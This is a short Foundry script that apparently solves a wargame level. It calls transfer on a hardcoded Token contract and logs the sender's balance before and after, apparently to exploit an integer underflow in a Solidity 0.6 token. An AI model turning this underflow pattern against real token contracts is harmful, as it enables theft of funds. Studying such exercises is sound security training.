//SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {Script,console} from "forge-std/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenSolution is Script {
  Token tokenInstance = Token(0xCF0946a1aFB6Badc50BE6575506c23193A40723a);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
    console.log("msg.sender: ", msg.sender);
    console.log("Balance: ", tokenInstance.balanceOf(msg.sender));
    tokenInstance.transfer(msg.sender,21);
    console.log("Balance: ", tokenInstance.balanceOf(msg.sender));
    vm.stopBroadcast();
  }
}